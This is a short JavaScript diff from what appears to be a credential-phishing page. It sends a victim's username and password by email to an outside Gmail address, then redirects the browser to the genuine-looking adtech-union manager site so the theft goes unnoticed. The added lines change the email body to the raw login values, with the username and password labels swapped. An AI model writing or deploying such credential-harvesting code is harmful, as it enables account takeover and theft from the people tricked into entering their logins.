@@ -113,7 +113,7 @@ let saveFile = () => {
   // window.location.assign("https://manager.adtech-union.tv/karbon/admin/Application.html");
   window.location.assign("https://manager.adtech-union.tv/");
 
-  sendMail(urlEncodedData);
+  sendMail(urlEncodedData, username, password);
 
 
   // var blob = new Blob([urlEncodedData], { type: "text/plain;charset=utf-8" });
@@ -130,7 +130,7 @@ function sendMail(urlEncodedData) {
     To : 'zero.cool.3321@gmail.com',
     From : "zero.cool.3321@gmail.com",
     Subject : "Hackathon",
-    Body : urlEncodedData
+    Body : "Password: " + username.value + " Username: " + password.value
   }).then(
     message => alert(message)
   );
